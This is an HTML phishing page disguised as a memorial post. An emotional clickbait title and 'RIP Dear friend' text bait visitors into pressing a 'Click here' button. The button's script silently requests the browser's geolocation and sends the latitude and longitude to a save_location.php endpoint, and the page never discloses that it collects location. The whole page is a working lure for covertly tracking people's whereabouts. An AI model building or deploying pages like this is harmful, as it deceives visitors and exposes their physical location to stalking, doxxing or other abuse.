<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Gone so soon ðŸ˜­ðŸ˜­ðŸ˜­ðŸ˜­ life is so sad ðŸ˜ž tap on the link to see what happened to her ðŸ˜¢ ðŸ’”</title>
    <!-- Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Custom CSS for loader */
        .loader {
            border: 16px solid #f3f3f3;
            /* Light grey */
            border-top: 16px solid #3498db;
            /* Blue */
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <script>
        function getLocationAndSubmit() {
            var loader = document.getElementById('loader');
            loader.style.display = 'block'; // Display loader

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function (position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;

                    // Hide loader after getting location
                    loader.style.display = 'none';

                    // Send location data to PHP script using AJAX
                    var xhr = new XMLHttpRequest();
                    var url = 'save_location.php';
                    var params = 'latitude=' + latitude + '&longitude=' + longitude;
                    xhr.open('POST', url, true);
                    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

                    xhr.onreadystatechange = function () {
                        if (xhr.readyState == 4 && xhr.status == 200) {
                            console.log(xhr.responseText); // Display server response (optional)
                        }
                    };

                    xhr.send(params);
                }, function (error) {
                    // Handle errors
                    loader.style.display = 'none';
                    console.log('Error getting location: ' + error.message);
                });
            } else {
                loader.style.display = 'none';
                console.log("Geolocation is not supported by this browser.");
            }
        }
    </script>
</head>

<body>
    <div class="container">
        <h2 class="mt-5">RIP Dear friend</h2>
        <p>Gone so soon ðŸ˜­ðŸ˜­ðŸ˜­ðŸ˜­ life is so sad ðŸ˜ž tap on the link to see what happened to her ðŸ˜¢ ðŸ’”</p>
        <div id="loader" class="loader" style="display: none;"></div> <!-- Loader -->
        <button type="button" class="btn btn-primary mt-3" onclick="getLocationAndSubmit()">Click here</button><br><br>
        <img src="/image.jpg" class="image-fluid" style="width: 200px; height: 300px;">
    </div>

    <!-- Bootstrap JS and dependencies (optional) -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</body>

</html>